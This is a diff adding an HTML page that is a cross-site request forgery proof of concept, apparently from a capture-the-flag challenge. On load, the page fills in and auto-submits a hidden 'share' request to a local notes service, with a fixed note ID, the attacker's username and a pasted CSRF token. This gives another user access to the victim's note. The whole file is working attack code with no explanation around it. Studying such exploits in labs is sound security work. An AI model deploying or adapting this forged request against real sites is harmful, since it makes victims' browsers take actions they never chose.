@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Notes</title>
+</head>
+
+<body>
+    <form action="http://127.0.0.1:1337/share" method="POST">
+        <input type="text" name="note_id" placeholder="Note">
+        <input type="text" name="user" placeholder="User">
+        <input type="text" name="csrf_token" placeholder="Message">
+        <input type="submit" value="Share">
+    </form>
+    <script>
+        // autosubmit form
+        document.forms[0].note_id.value = "00000000000000000000000000000000";
+        document.forms[0].user.value = "legoclones";
+        document.forms[0].csrf_token.value = "5d7ef1b20ff2f47c945c8b298a5253d851bb7ffad110b67f6f9797549df4a036"; // replace with an actual CSRF token
+        document.forms[0].submit();
+    </script>
+</body>
+</html>
